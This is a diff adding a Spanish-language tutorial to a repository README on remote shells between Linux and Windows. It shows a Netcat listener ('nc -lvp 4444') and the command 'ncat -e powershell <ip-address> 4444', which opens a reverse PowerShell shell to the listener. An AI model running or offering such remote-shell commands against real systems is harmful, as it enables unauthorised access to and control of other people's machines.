@@ -1,6 +1,31 @@
 # RemotePowerShells
 Repositorio sobre shell remotas.
 
+# Shell Remota entre Linux y Windows con Ncat
+
+Este documento proporciona una guía paso a paso para establecer una shell remota entre una máquina Linux y una máquina Windows utilizando Netcat en Linux y Ncat en Windows, con la ventana de PowerShell en la máquina Windows.
+
+## En la máquina Linux (Listener)
+
+1. Abre una terminal.
+2. Ejecuta el siguiente comando para iniciar un listener con Netcat:
+   ```bash
+   nc -lvp 4444
+   ```
+   Donde `4444` es el puerto en el que deseas escuchar.
+
+## En la máquina Windows (Conector)
+
+1. Abre cmd.exe.
+2. Inicia una shell remota con la ventana de PowerShell con el siguiente comando:
+   ```
+   ncat -e powershell <ip-address> 4444
+   ```
+   Donde `<ip-address>` es la dirección IP de tu máquina Linux y `4444` es el puerto que especificaste en el comando Netcat.
+
+Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de PowerShell de tu máquina Windows.
+
+
 
 # Shell Remota entre Linux y Windows
 
